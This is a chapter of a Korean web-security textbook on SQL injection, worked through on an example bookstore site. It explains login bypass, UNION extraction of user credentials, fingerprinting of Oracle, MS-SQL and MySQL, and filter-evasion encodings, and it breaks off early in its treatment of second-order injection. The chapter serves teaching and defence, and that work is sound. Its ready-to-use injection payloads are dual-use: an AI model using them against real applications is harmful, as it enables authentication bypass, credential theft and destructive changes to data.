# 27장. 데이터 저장소 인젝션: SQL, NoSQL, XPath, LDAP

> **이 장에서 다루는 것**
>
> - 인젝션이라 불리는 모든 취약점이 사실은 하나의 구조 — 데이터와 구분자가 같은 채널을 공유한다는 것 — 의 반복임을 확인한다
> - 로그인 우회에서 시작해 SQL 인젝션의 탐지·핑거프린팅·UNION 추출·블라인드·시간 기반·out-of-band·조건부 오류까지, 실제로 동작하는 형태로 익힌다
> - SQL을 넘어 데이터베이스 권한 상승, 운영체제 명령, 파일 접근으로 공격이 어떻게 번지는지, 그리고 그 경계가 어디인지 안다
> - 파라미터화 질의가 왜 효과가 있는지를 우연이 아니라 구조로 설명하고, 도메인 프리미티브가 그 방어를 타입 수준으로 끌어올리는 방식을 본다
> - 같은 결함이 NoSQL, XPath, LDAP, 그리고 GraphQL이라는 새 진입점에서 어떻게 재현되는지 안다

앞의 두 장(25장, 26장)은 서버가 받는 입력에 대해 두 가지를 확정했다. 25장은 공격자가 어디로 데이터를 밀어 넣을 수 있는지 — 모든 파라미터, 쿠키, 헤더 — 를 지도로 그렸고, 26장은 그 입력에 대해 클라이언트에 둔 어떤 통제도 서버를 지켜 주지 못한다는 것을 증명했다. 그 결과 우리는 이제 하나의 전제 위에 서 있다. **임의의 바이트가, 아무 검증 없이, 서버 코드에 도달할 수 있다.**

이 장은 그 바이트가 서버 안에서 무엇이 되는지를 다룬다. 웹 애플리케이션은 혼자 일하지 않는다. 그것은 데이터베이스에 질의를 던지고, 디렉터리 서비스에 필터를 보내고, XML 문서를 탐색한다. 이 모든 상호작용은 **해석되는 언어(interpreted language)** 로 이뤄진다. SQL, XPath, LDAP 검색 필터, MongoDB의 JavaScript — 이들은 모두 런타임에 문자열을 읽어 그것이 지시하는 동작을 수행하는 인터프리터를 가진다. 그리고 애플리케이션이 그 문자열을, 프로그래머가 쓴 명령과 사용자가 보낸 데이터를 **이어 붙여서** 만들 때, 재앙의 조건이 갖춰진다.

이 장의 논지는 하나다. 인젝션의 본질은 새로운 공격 기법의 발명이 아니라 **데이터와 구분자가 같은 채널을 공유한다**는 오래된 구조다. 이 구조는 이 책에서 처음 나오는 것이 아니다. 우리는 이미 세 번 그것을 봤다. 27.1절이 그 셋을 다시 불러 세우는 것으로 이 장을 연다.

실행 예제는 온라인 서점(`www.example-books.com`)이다. 저자·제목·출판사로 책을 검색하고, 사용자가 계정을 만들고, 주문을 넣는다. 이 평범한 서점이 이 장 전체에서 반복적으로 털린다.

## 27.1 해석 컨텍스트로의 인젝션 — 로그인 우회로 시작하기

**해석 언어(interpreted language)** 란 코드를 실행하기 위해 그것을 읽고 해석하는 런타임 구성 요소를 두는 언어다. 반대로 **컴파일 언어(compiled language)** 는 코드가 생성 시점에 기계 명령으로 변환되고, 실행 시점에는 그 명령이 프로세서에서 직접 수행된다. 원리상 어떤 언어든 인터프리터로도 컴파일러로도 구현할 수 있지만, 웹 애플리케이션을 지탱하는 핵심 언어들 — SQL, LDAP, Perl, PHP — 은 대체로 인터프리터로 구현된다.

이 실행 방식 때문에 **코드 인젝션(code injection)** 이라 불리는 취약점 계열이 생긴다. 쓸모 있는 애플리케이션이라면 사용자가 보낸 데이터를 받아 조작하고 그에 따라 행동한다. 그러므로 인터프리터가 처리하는 코드는 **프로그래머가 쓴 명령과 사용자가 공급한 데이터의 혼합물**이다. 어떤 상황에서 공격자는 데이터 컨텍스트를 탈출하는 입력을 만들 수 있다 — 대개 그 인터프리터의 문법에서 특별한 의미를 갖는 구문을 공급함으로써. 그 결과 입력의 일부가 프로그램 명령으로 해석되고, 원래 프로그래머가 쓴 것과 똑같이 실행된다.

여기서 한 걸음 물러서서 이 구조를 정확히 보자. 인터프리터에게 넘어가는 것은 **하나의 문자열**이다. 그 문자열 안에서 어디까지가 "구조를 정하는 문법 요소"(키워드, 따옴표, 괄호, 논리 연산자)이고 어디부터가 "채워 넣을 데이터"인지는, **오직 문자열 자체의 내용으로만** 구분된다. 별도의 통로가 없다. 데이터와 구분자가 같은 채널을 공유한다. 따라서 데이터로 들어가야 할 자리에 구분자로 해석될 문자를 밀어 넣으면, 그 순간 데이터가 구조를 바꾼다.

### 이 구조는 이 책에서 네 번째다

이 문장이 낯설지 않아야 한다. 우리는 이 구조를 이미 세 번 만났다.

- **8.7절**에서 HTTP 헤더 인젝션과 응답 분할을 다뤘다. 거기서 메시지의 구조 — 어디서 헤더가 끝나고 본문이 시작하는가 — 를 정하는 것은 CR/LF라는 두 바이트였다. 사용자 입력이 그 두 바이트를 포함할 수 있으면, 입력이 메시지의 구조를 바꾼다. 데이터(헤더 값)와 구분자(CR/LF)가 같은 채널을 공유했다.
- **10.4절**에서 본문 경계가 `Content-Length`와 `Transfer-Encoding` 두 방식으로 동시에 지시될 때 중간자와 종단이 다르게 해석하는 문제를 봤다. 거기서도 "메시지 하나가 어디서 끝나는가"라는 구조를, 메시지 안에 실린 값이 정했다.
- **16.6절**에서 검증되지 않은 문자열을 로그에 쓰면 로그 인젝션이 된다고 했다. 로그 파일에서 "한 줄이 하나의 사건"이라는 구조를, 사용자가 넣은 개행 문자가 깨뜨렸다.

이 장의 SQL 인젝션은 이 셋과 **다른 취약점이 아니다.** 같은 구조의 네 번째 사례다. 채널이 HTTP 메시지에서 SQL 질의로, 구분자가 CR/LF에서 작은따옴표로 바뀌었을 뿐이다. 이 점을 붙잡으면 이 장의 열네 개 절이 각기 다른 인터프리터를 다루면서도 왜 똑같은 리듬으로 흘러가는지가 보인다. 새 인터프리터를 만날 때마다 물어야 할 질문은 하나다 — **여기서 데이터와 구분자를 나누는 문법 요소는 무엇인가, 그리고 내가 그것을 데이터로 밀어 넣을 수 있는가.**

### 로그인 우회 — 가장 짧은 증명

애플리케이션이 데이터 저장소에 접근하는 과정은, 그 접근이 권한 없는 사용자의 행동에서 비롯됐든 관리자의 행동에서 비롯됐든 대개 같다. 웹 애플리케이션은 데이터 저장소에 대한 **임의 접근 제어(discretionary access control)** 장치로 기능한다. 사용자의 계정과 유형에 따라 데이터를 읽고 추가하고 수정하는 질의를 구성한다. 질의를 — 질의 안의 데이터가 아니라 질의 자체를 — 바꾸는 데 성공한 인젝션은, 이 애플리케이션 계층의 접근 제어를 통째로 우회한다.

폼 기반 로그인을 구현한 많은 애플리케이션이 데이터베이스에 자격증명을 저장하고, 로그인 시도마다 단순한 SQL 질의로 검증한다. 전형적인 예는 이렇다.

```sql
SELECT * FROM users WHERE username = 'marcus' AND password = 'secret'
```

이 질의는 `users` 테이블의 모든 행을 검사해, `username`이 `marcus`이고 `password`가 `secret`인 레코드를 뽑는다. 사용자의 정보가 반환되면 로그인은 성공하고, 애플리케이션은 인증된 세션을 만든다.

이제 공격자가 관리자 계정명이 `admin`임을 안다고 하자. 그는 아무 비밀번호나 넣고, 사용자명 자리에 다음을 넣는다.

```
admin'--
```

그러면 질의는 이렇게 된다.

```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = 'foo'
```

이중 하이픈(`--`)은 SQL에서 "이 줄의 나머지는 주석이니 무시하라"는 의미다. 따라서 실제로 실행되는 질의는 다음과 동등하다.

```sql
SELECT * FROM users WHERE username = 'admin'
```

비밀번호 검사가 통째로 사라졌다. 공격자가 넣은 작은따옴표는 프로그래머가 열어 둔 문자열을 닫았고, `--`는 프로그래머가 쓴 나머지 질의를 지웠다. 데이터로 들어갈 자리에 구분자(`'`)와 명령(`--`)을 밀어 넣어 질의의 구조를 바꾼 것이다.

관리자 계정명을 모른다면 어떨까. 대부분의 애플리케이션에서 데이터베이스의 첫 계정이 관리자다 — 이 계정은 수동으로 만들어진 뒤 나머지 계정을 생성하는 데 쓰이기 때문이다. 게다가 질의가 두 명 이상의 사용자를 반환하면 대부분의 애플리케이션은 그냥 첫 번째 사용자를 처리한다. 공격자는 이 동작을 이용해, 사용자명 자리에 다음을 넣는다.

```
' OR 1=1--
```

질의는 이렇게 된다.

```sql
SELECT * FROM users WHERE username = '' OR 1=1--' AND password = 'foo'
```

주석 뒤를 무시하면 이는 `WHERE username = '' OR 1=1`과 동등하다. `1`은 언제나 `1`과 같으므로, 이 질의는 모든 사용자를 반환하고, 애플리케이션은 그 첫 번째 — 관리자 — 로 로그인시킨다.

이것이 인젝션의 가장 짧은 증명이다. 여기서 강조할 것은, 이 기법이 SQL만의 것이 아니라는 점이다. 애플리케이션 로직을 바꾸기 위해 해석 컨텍스트에 인젝션하는 것은 **일반적 공격 기법**이다. 대응하는 취약점이 LDAP 질의, XPath 질의, 메시지 큐, 또는 임의의 커스텀 질의 언어에서 똑같이 생길 수 있다. 이 장의 뒷부분(27.11~27.14)이 바로 그 재현을 보여 준다.

> **이 절이 뒷받침하는 것**
>
> - 데이터와 구분자가 채널을 공유한다는 구조 → **8.7**(CR/LF가 HTTP 메시지 구조를 정함), **10.4**(본문 경계의 이중 지시), **16.6**(로그 인젝션)과 같은 뿌리. 이 장은 그 구조의 네 번째 사례다.

## 27.2 SQL 인젝션 기초 — 기본 취약점 익스플로잇, 구문 유형별 인젝션

거의 모든 웹 애플리케이션이 데이터베이스를 쓴다. 온라인 서점은 사용자 계정과 자격증명, 판매 상품의 설명과 가격, 주문과 결제 정보, 사용자별 권한을 데이터베이스에 담는다. 이 데이터에 접근하는 수단이 **구조화 질의 언어(Structured Query Language, SQL)** 다.

SQL은 해석 언어이고, 웹 애플리케이션은 사용자 데이터를 포함하는 SQL 문을 흔히 구성한다. 이것이 안전하지 못한 방식으로 이뤄지면 애플리케이션은 **SQL 인젝션**에 취약해진다. 가장 심각한 경우, SQL 인젝션은 익명의 공격자가 데이터베이스의 모든 데이터를 읽고 수정하게 하며, 심지어 데이터베이스가 도는 서버를 완전히 장악하게 한다.

이 절과 다음 여섯 절의 예시는 세 가지 주요 데이터베이스 — Oracle, MS-SQL, MySQL — 로 한정한다. SQL 인젝션의 근본은 이들 모두에 공통이지만, 문법의 사소한 차이부터 동작과 기능의 큰 차이까지 존재하며, 그 차이가 구사 가능한 공격의 종류를 좌우한다. 차이가 중요한 곳에서는 세 플랫폼을 구분해 표시한다.

### 27.2.1 기본 취약점 익스플로잇

온라인 서점의 검색 기능을 보자. 사용자가 출판사 Wiley의 책을 검색하면 애플리케이션은 다음 질의를 수행한다.

```sql
SELECT author, title, year FROM books WHERE publisher = 'Wiley' AND published = 1
```

이 질의에서 등호 왼쪽의 것들 — `publisher`, `published` 같은 열 이름과 SQL 키워드 — 은 프로그래머가 만든 부분이다. `Wiley`는 사용자가 공급한 것으로, 그 의미는 하나의 데이터 항목이다. SQL에서 문자열 데이터는 나머지 질의와 구분되기 위해 **작은따옴표로 감싸진다.** 바로 이 따옴표가 데이터와 구분자를 나누는 문법 요소다.

이제 사용자가 O'Reilly를 검색하면 어떻게 되는지 보자. 질의는 이렇게 구성된다.

```sql
SELECT author, title, year FROM books WHERE publisher = 'O'Reilly' AND published = 1
```

인터프리터는 따옴표 안의 문자열 데이터를 파싱해 값 `O`를 얻는다. 그런 다음 `Reilly'`라는 표현을 만나는데, 이는 유효한 SQL 구문이 아니므로 오류를 낸다.

```
Server: Msg 105, Level 15, State 1, Line 1
Unclosed quotation mark before the character string 'Reilly'.
```

애플리케이션이 이렇게 동작하면 그것은 SQL 인젝션에 활짝 열려 있는 것이다. O'Reilly의 아포스트로피가 우연히 한 일 — 문자열을 조기에 닫고 그 뒤를 명령으로 만든 일 — 을, 공격자는 의도적으로 한다. 그는 검색어로 다음을 넣는다.

```
Wiley' OR 1=1--
```

질의는 이렇게 된다.

```sql
SELECT author, title, year FROM books WHERE publisher = 'Wiley' OR 1=1--' AND published = 1
```

`WHERE` 절에 두 번째 조건이 붙었다. `publisher`가 `Wiley`이거나 `1=1`인 모든 행 — 즉 `books` 테이블의 모든 레코드 — 이 반환된다. 원래 질의는 `published = 1`로 출간된 책만 보여 줬지만, 주석으로 그 조건을 지워 미출간 도서까지 모두 노출시켰다. 이것은 접근 제어 우회다.

**따옴표 균형 맞추기.** 주석 기호를 쓰지 않고 뒤따르는 따옴표를 처리하는 방법도 있다. 문자열 데이터로 입력을 끝내 뒤의 따옴표가 그것을 감싸게 하는 것이다. 검색어로 다음을 넣으면,

```
Wiley' OR 'a'='a
```

질의는 이렇게 되어 완벽히 유효하다.

```sql
SELECT author, title, year FROM books WHERE publisher = 'Wiley' OR 'a'='a' AND published = 1
```

> **주의.** MySQL에서 이중 하이픈 주석은 뒤에 공백이 있어야 한다(`-- `). 공백 없는 주석을 원하면 해시 문자(`#`)를 쓴다.

### 27.2.2 구문 유형별 인젝션

SQL 문의 대부분은 몇 개의 동사로 시작한다. `SELECT`가 가장 흔하므로 SQL 인젝션도 대개 `SELECT` 문에서 생긴다. 그러나 인젝션은 **어떤 유형의 문에서도** 생길 수 있다. 원격 애플리케이션을 상대할 때 어떤 입력이 어떤 문으로 처리될지 미리 알 수는 없지만, 기능의 종류로 합리적 추측은 가능하다.

**표 27-1. SQL 문 유형별 인젝션 지점과 위험**

| 문 유형 | 전형적 기능 | 주 인젝션 지점 | 특기할 위험 |
|---|---|---|---|
| `SELECT` | 카탈로그 열람, 프로필 조회, 검색, 로그인 | `WHERE` 절 (문 끝이라 주석으로 잘라내기 쉬움), 가끔 `ORDER BY`·테이블·열 이름 | 데이터 유출 |
| `INSERT` | 감사 로그, 회원 가입, 주문 생성 | `VALUES` 절 | 임의 값으로 계정·권한 생성 |
| `UPDATE` | 연락처 수정, 비밀번호 변경, 주문 수량 변경 | `WHERE` 절 | `WHERE`를 무력화하면 **전체 행 변경** |
| `DELETE` | 장바구니 삭제, 배송지 삭제 | `WHERE` 절 | `WHERE`를 무력화하면 **전체 행 삭제** |

**SELECT 문.** 인젝션 진입점은 보통 `WHERE` 절이다. `WHERE`는 `SELECT` 문의 마지막 구성 요소이므로, 공격자는 주석 기호로 자기 입력 이후를 잘라내면서도 전체 질의의 구문을 무효화하지 않을 수 있다.

**INSERT 문.** 새 행을 만든다. 회원 가입이 전형적이다.

```sql
INSERT INTO users (username, password, ID, privs) VALUES ('daf', 'secret', 2248, 1)
```

`username`이나 `password`가 취약하면 공격자는 자기 값으로 `ID`와 `privs`를 넣을 수 있다. 다만 `VALUES` 절의 나머지를 문법적으로 완성해야 한다 — 올바른 개수와 올바른 타입의 항목이 있어야 한다. `username` 자리에 인젝션한다면 다음을 넣는다.

```
foo', 'bar', 9999, 0)--
```

이는 `ID`가 9999이고 `privs`가 0인 계정을 만든다. `privs`가 권한을 정한다면 이로써 관리자 계정을 만들 수 있다. 필드 개수를 모를 때는 하나씩 늘려 가며 계정이 실제로 만들어질 때까지 시도한다.

```
foo')--
foo', 1)--
foo', 1, 1)--
foo', 1, 1, 1)--
```

대부분의 데이터베이스가 정수를 문자열로 암묵 변환하므로 각 자리에 정수를 넣어도 된다. 완전히 블라인드 상태에서 `INSERT`에 인젝션하면, 데이터베이스 버전 문자열을 자기 프로필 필드에 넣어 브라우저로 되돌려받는 식으로 문자열 데이터를 뽑아낼 수도 있다.

**UPDATE 문과 DELETE 문.** 기존 행을 수정하거나 삭제하며, 어느 행에 적용할지를 `WHERE` 절이 정한다. 비밀번호 변경이 전형적이다.

```sql
UPDATE users SET password = 'newsecret' WHERE user = 'marcus' AND password = 'secret'
```

여기서 `marcus`가 취약하면 공격자는 사용자명에 `admin'--`을 넣어 admin의 비밀번호를 자기 것으로 바꿀 수 있다. 그러나 여기에는 **원격 탐침의 근본적 위험**이 있다. `WHERE` 절을 무력화하는 입력은 치명적이다. 만약 사용자명에 `admin' OR 1=1--`을 넣으면,

```sql
UPDATE users SET password = 'newsecret' WHERE user = 'admin' OR 1=1
```

이 되어 **모든 사용자의 비밀번호가 리셋된다.** 이 위험은 데이터를 변경하지 않아 보이는 기능 — 로그인 같은 — 을 공격할 때도 존재한다. 로그인 성공 후 애플리케이션이 공급된 사용자명으로 여러 `UPDATE` 질의를 수행하는 경우가 있기 때문이다. 실무에서 SQL 인젝션을 탐침하거나 익스플로잇하기 전에 소유자의 동의를 받고, 전체 데이터베이스 백업을 강하게 권해야 하는 이유가 이것이다.

## 27.3 SQL 인젝션 버그 찾기 / 데이터베이스 핑거프린팅

### 27.3.1 버그 찾기

가장 명백한 경우 SQL 인젝션은 예상 밖 입력 하나로 발견되고 확증된다. 그러나 미묘한 경우도 있어, 순서에 따라 체계적으로 검증해야 한다.

25장의 애플리케이션 매핑(→ 25.5)에서 데이터베이스에 접근하는 것으로 보이는 지점을 식별했을 것이다. 그러나 그것으로 충분하지 않다. **서버로 보내는 모든 데이터 항목** — URL 파라미터, 쿠키, POST 데이터, HTTP 헤더 — 이 사용자 눈에 보이지 않는 방식으로 데이터베이스 함수에 넘어갈 수 있다. 각 항목의 이름과 값 모두에 취약점이 있을 수 있다. 그리고 여러 요청에 걸쳐 데이터를 모으는 다단계 프로세스는 끝까지 밟아야 한다 — 데이터가 마지막 단계에서야 데이터베이스에 저장되는 경우가 많다.

**문자열 데이터에 인젝션.** 사용자 문자열은 작은따옴표로 감싸지므로, 이를 탈출해야 한다.

1. **작은따옴표 하나**를 넣어 오류나 다른 변화가 있는지 관찰한다. 상세한 DB 오류 메시지가 나오면 27.8절의 구문·오류 레퍼런스로 그 의미를 해석한다.
2. 오류가 났다면 **작은따옴표 둘**을 넣는다. 데이터베이스는 두 개의 작은따옴표를 리터럴 따옴표 하나의 이스케이프로 처리한다. 이 입력으로 오류가 사라지면 취약할 가능성이 높다.
3. **문자열 연접 문자**로 무해한 입력과 동등한 문자열을 만든다. 애플리케이션이 이를 원래 입력과 같게 처리하면 취약하다. `foo`와 동등한 입력을 만드는 방법은 데이터베이스마다 다르다.
   - **Oracle:** `'||'foo`
   - **MS-SQL:** `'+'foo`
   - **MySQL:** `' 'foo` (두 따옴표 사이 공백)

와일드카드 문자 `%`를 검색 필드에 넣어 많은 결과가 돌아오면 입력이 SQL 질의로 넘어가는 정황이다(취약의 증명은 아니다). 또한 작은따옴표를 넣었을 때 브라우저에서 **JavaScript 오류**가 나는지 살펴라. 사용자 입력이 JavaScript 안으로 반환되는 일이 흔하고, 이스케이프되지 않은 따옴표는 SQL 인터프리터에서처럼 JavaScript 인터프리터에서도 오류를 낸다. 임의 JavaScript를 응답에 넣을 수 있다는 것은 크로스 사이트 스크립팅으로 이어진다(→ 32장).

**숫자 데이터에 인젝션.** 숫자는 따옴표 없이 질의에 직접 들어가는 경우가 많다.

1. 원래 값과 동등한 **수식**을 넣는다. 값이 `2`라면 `1+1`이나 `3-1`을 넣어 같은 결과가 나오는지 본다.
2. 이 검사는 값이 애플리케이션 동작에 눈에 띄는 영향을 줄 때 가장 믿을 만하다.
3. 성공하면 SQL 전용 키워드로 더 확실히 한다. `ASCII` 명령은 문자의 ASCII 코드를 반환한다. `A`의 ASCII 값이 65이므로 `67-ASCII('A')`는 SQL에서 `2`와 동등하다.
4. 작은따옴표가 필터링되면, 숫자를 문자열로 암묵 변환하는 성질을 이용한다. 문자 `1`의 ASCII 값이 49이므로 `51-ASCII(1)`은 `2`와 동등하다.

**HTTP 특수 문자 인코딩.** 페이로드에 특수 문자를 넣을 때는 반드시 URL 인코딩해야 한다(→ 7.6). `&`와 `=`는 이름/값 쌍을 잇는 데 쓰이므로 각각 `%26`, `%3d`로 인코딩한다. 공백은 쿼리 문자열에서 허용되지 않으므로 `+`나 `%20`으로, 실제 `+`는 `%2b`로 인코딩한다(따라서 `1+1`은 `1%2b1`). 세미콜론은 `%3b`로 인코딩한다. 이 인코딩을 빠뜨리면 요청 전체가 무효가 되거나 의도치 않은 데이터를 보내게 된다.

**질의 구조에 인젝션.** 사용자 데이터가 질의 안의 데이터 항목이 아니라 **질의 구조 자체**에 들어간다면, 익스플로잇은 그냥 유효한 SQL 구문을 직접 공급하는 것이다. 따옴표 탈출이 필요 없다. 가장 흔한 지점은 `ORDER BY` 절이다.

```sql
SELECT author, title, year FROM books WHERE publisher = 'Wiley' ORDER BY title ASC
```

`title`이 사용자 지정이면 따옴표 없이 구조를 직접 바꾼다. 정렬 파라미터에 `1`부터 숫자를 넣어 보면(`ORDER BY 1`은 첫 열 기준 정렬), 결과 순서가 바뀌면 `ORDER BY` 절에 들어가는 것이고, 열 개수보다 큰 수를 넣어 질의가 실패하면 `1 ASC --`, `1 DESC --`로 추가 SQL 인젝션이 가능함을 확인할 수 있다.

> **주의.** `ORDER BY` 절의 인젝션은 특별하다. 이 지점에서는 데이터베이스가 `UNION`, `WHERE`, `OR`, `AND` 키워드를 받지 않는다. 게다가 파라미터화 질의나 따옴표 이스케이프로는 **막을 수 없다** — 열 이름과 정렬 키워드는 질의 구조의 일부이기 때문이다(→ 27.9). 익스플로잇은 대개 파라미터 자리에 중첩 질의를 넣어 추론 기법을 쓴다: `(SELECT 1 WHERE <<조건>> OR 1/0=0)`. 이것이 현대 애플리케이션에서 눈여겨봐야 할 핵심 벡터다.

### 27.3.2 데이터베이스 핑거프린팅

고급 익스플로잇으로 갈수록 플랫폼 차이가 커져, 어떤 데이터베이스인지 알아야 한다. 버전 문자열을 뽑는 방법(→ 27.4)이 있지만, 그럴 수 없어도 핑거프린팅이 가능하다.

가장 믿을 만한 것은 **문자열 연접 방식의 차이**다. 문자열 `services`를 세 방식으로 구성해 보고 같은 결과가 나오는 방식으로 데이터베이스를 식별한다.

- **Oracle:** `'serv'||'ices'`
- **MS-SQL:** `'serv'+'ices'`
- **MySQL:** `'serv' 'ices'` (공백)

숫자 데이터에 인젝션한다면, 각 데이터베이스에서 `0`으로 평가되고 다른 데이터베이스에서는 오류를 내는 문자열을 쓴다.

- **Oracle:** `BITAND(1,1)-BITAND(1,1)`
- **MS-SQL:** `@@PACK_RECEIVED-@@PACK_RECEIVED`
- **MySQL:** `CONNECTION_ID()-CONNECTION_ID()`

MySQL은 인라인 주석 처리가 독특하다. 주석이 느낌표와 버전 문자열로 시작하면, 실제 데이터베이스 버전이 그 문자열 이상일 때만 주석 내용이 실제 SQL로 해석된다. 이를 이용해 정확한 버전을 알아낼 수 있다. 다음 문자열은 MySQL 버전이 3.23.02 이상이면 `WHERE` 절을 거짓으로 만든다.

```
/*!32302 AND 1=0*/
```

## 27.4 UNION 연산자와 유용한 데이터 추출

`UNION` 연산자는 둘 이상의 `SELECT` 문 결과를 하나의 결과 집합으로 합친다. `SELECT` 문에 SQL 인젝션이 있고 질의 결과가 브라우저로 반환되면, `UNION`으로 **완전히 별개의 두 번째 질의**를 수행해 그 결과를 첫 질의에 붙일 수 있다. 결과가 직접 반환되는 상황에서 임의 데이터를 뽑는 가장 빠른 방법이다.

서점 검색으로 돌아가자. Wiley를 검색하면 `SELECT author, title, year FROM books WHERE publisher = 'Wiley'`가 실행된다. 공격자가 검색어로 다음을 넣으면,

```
Wiley' UNION SELECT username, password, uid FROM users--
```

질의는 이렇게 되어, 원래 검색 결과 뒤에 `users` 테이블 전체가 붙는다.

```sql
SELECT author, title, year FROM books WHERE publisher = 'Wiley'
UNION SELECT username, password, uid FROM users--'
```

합쳐진 결과의 열 이름은 첫 질의 것을 따르므로, 사용자명이 `author` 열에, 비밀번호가 `title` 열에 나타난다. 애플리케이션은 데이터가 다른 테이블에서 왔음을 알 방법이 없다.

`UNION`을 쓰려면 두 가지 전제가 필요하다.

- **두 결과 집합의 구조가 같아야 한다** — 같은 개수의 열, 같거나 호환되는 데이터 타입, 같은 순서. 열 개수가 틀리면 `ORA-01789: query block has incorrect number of result columns`, 타입이 안 맞으면 `ORA-01790: expression must have same datatype as corresponding expression` 같은 오류가 난다(오류는 Oracle 기준).
- **목표 테이블과 열의 이름을 알아야** 흥미로운 결과를 얻는다.

오류가 트랩되어 안 보여도 과제는 대개 쉽다. 세 가지 사실 덕분이다. 타입은 동일할 필요 없이 **호환**이면 되고, `NULL`은 어떤 타입으로도 변환되므로 타입을 모르면 그냥 `NULL`을 넣는다. 인젝션한 질의가 실행됐는지는 결과에 행이 추가되는 것으로 알 수 있다. 그리고 대부분의 목표는 원래 질의에서 **문자열 타입 열 하나**만 찾으면 달성된다.

**열 개수 알아내기.** `NULL`을 하나씩 늘려 가며 질의가 실행될 때까지 시도한다.

```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
```

질의가 실행되면(추가 행이 나타나면) 열 개수를 안 것이다. HTML로 렌더링하면 빈 셀이 안 보일 수 있으니 원시 응답을 보는 게 좋다.

**문자열 열 찾기.** 열 개수를 안 뒤 `NULL`을 하나씩 `'a'`로 바꿔 본다.

```sql
' UNION SELECT 'a', NULL, NULL--
' UNION SELECT NULL, 'a', NULL--
' UNION SELECT NULL, NULL, 'a'--
```

`a`가 담긴 행이 나타나면 그 열로 데이터를 뽑을 수 있다.

> **주의.** Oracle에서는 모든 `SELECT`에 `FROM`이 필요하므로 전역 접근 가능한 `DUAL` 테이블에서 선택한다: `' UNION SELECT NULL FROM DUAL--`.

**버전 문자열 추출(개념 증명).** 열 세 개에 첫 열이 문자열이면,

```sql
' UNION SELECT @@version, NULL, NULL--          -- MS-SQL, MySQL
' UNION SELECT banner, NULL, NULL FROM v$version--   -- Oracle
```

**메타데이터로 테이블·열 이름 알아내기.** 주요 DBMS는 풍부한 메타데이터를 담아 두어, 이를 질의해 모든 테이블·열 이름을 발견할 수 있다.

- **MS-SQL, MySQL, PostgreSQL, SQLite:** `information_schema.columns`
- **Oracle:** `all_tab_columns`(전체) 또는 `user_tab_columns`(현재 스키마)

```sql
' UNION SELECT table_name, column_name, NULL, NULL, NULL FROM information_schema.columns--
```

큰 데이터베이스에서는 테이블보다 흥미로운 열 이름을 직접 찾는 게 낫다.

```sql
SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%PASS%'
```

여러 열은 하나로 연접하면 문자열 열 하나만으로 추출이 끝난다.

- **Oracle:** `SELECT table_name||':'||column_name FROM all_tab_columns`
- **MS-SQL:** `SELECT table_name+':'+column_name FROM information_schema.columns`
- **MySQL:** `SELECT CONCAT(table_name,':',column_name) FROM information_schema.columns`

> **이 절이 뒷받침하는 것**
>
> - `UNION` 기반 추출은 질의 결과가 브라우저로 돌아올 때만 성립한다. 그렇지 않은 경우의 대안이 **27.6**(블라인드·시간 기반·out-of-band)이다.
> - 오류 메시지가 추출 채널이 되는 구조 → **30.1**(오류 메시지 익스플로잇)이 정보 노출의 관점에서 상세화한다.

## 27.5 필터 우회와 2차(second-order) SQL 인젝션

취약한 애플리케이션이 입력 필터를 두어 익스플로잇을 제한하는 경우가 있다. 특정 문자를 제거·정제하거나 SQL 키워드를 차단하는 식이다. 이런 필터는 대개 우회 가능하다.

### 27.5.1 차단된 문자 피하기

- **작은따옴표.** 숫자 필드나 열 이름에 인젝션한다면 따옴표가 필요 없다. 문자열이 꼭 필요하면 ASCII 코드로 동적 구성한다. 다음 둘은 각각 Oracle과 MS-SQL에서 `ename='marcus'`와 동등하다.

  ```sql
  ename = CHR(109)||CHR(97)||CHR(114)||CHR(99)||CHR(117)||CHR(115)      -- Oracle
  ename = CHAR(109)+CHAR(97)+CHAR(114)+CHAR(99)+CHAR(117)+CHAR(115)    -- MS-SQL
  ```

- **주석 기호.** 차단되면 주변 질의의 구문을 깨지 않게 입력을 짜면 된다. `' OR 1=1--` 대신 따옴표 균형을 맞춘 `' OR 'a'='a`를 쓴다.
- **세미콜론.** MS-SQL에 배치 질의를 인젝션할 때, 모든 질의의 구문을 맞추기만 하면 세미콜론 구분자 없이도 파서가 올바르게 해석한다.

### 27.5.2 단순 검증 우회 — 인코딩이 필터를 무력화한다

단순 블랙리스트 검증은 인코딩·정규화 결함(→ 7.6, 7.7)으로 우회된다. `SELECT` 키워드가 차단·제거될 때 다음을 시도한다.

```
SeLeCt                          -- 대소문자 변형 (SQL 키워드는 대소문자 무시)
%00SELECT                       -- 널 바이트 접두
SELSELECTECT                    -- 재귀 미적용: 중간의 SELECT를 제거하면 다시 SELECT
%53%45%4c%45%43%54              -- URL 인코딩
%2553%2545%254c%2545%2543%2554  -- 이중 URL 인코딩
```

이 우회들이 왜 통하는지는 7.7절에서 구조적으로 다룬 그대로다. 필터가 특정 바이트열을 찾는데, 애플리케이션이 필터 **이후에** 디코딩·정규화를 한 번 더 하면, 필터가 못 본 형태로 넣은 입력이 나중에 위험한 형태로 되살아난다. `SELSELECTECT`는 필터가 `SELECT`를 **한 번만** 비재귀적으로 제거한다는 가정을 깬다. 이중 URL 인코딩은 디코딩이 두 번 일어난다는 것을 이용한다. **필터와 인터프리터가 문자열을 다르게 읽으면, 그 틈으로 페이로드가 지나간다** — 이것이 8.7절, 10.4절과 정확히 같은 파싱 불일치의 구조다.

### 27.5.3 주석으로 공백 대체

공백이 제거·차단되면 인라인 주석 `/* */`으로 공백을 흉내 낸다.

```sql
SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
```

MySQL에서는 키워드 안에도 주석을 넣어 필터를 우회하면서 실제 질의 구문은 보존할 수 있다.

```sql
SEL/*foo*/ECT username,password FR/*foo*/OM users
```

### 27.5.4 2차 SQL 인젝션

가장 흥미로운 필터 우회는 **2차 SQL 인젝션**이다. 많은 애플리케이션이 데이터가 처음 들어올 때는 안전하게 다루지만, 저장된 데이터가 나중에 — 애플리케이션 자신이나 다른 백엔드 프로세스에 의해 — 안전하지 못하게 처리된다. 이 후속 프로세스들은 대개 품질이 낮으면서 고권한 DB 계정을 쓴다.

애플리케이션이 도착 시점에 작은따옴표를 이중화(escaping)한다고 하자. 사용자가 `O'Reilly`를 검색하면 질의는 `... WHERE publisher = 'O''Reilly'`가 되어, 이중화된 따옴표가 리터럴 하나로 처리되므로 안전하다. 회원 가입도 마찬가지다. `foo'`를 등록하면 다음이 실행되어 문제가 없다.

```sql
INSERT INTO users (username, password, ID, privs) VALUES ('foo''', 'secret', 2248, 1)
```

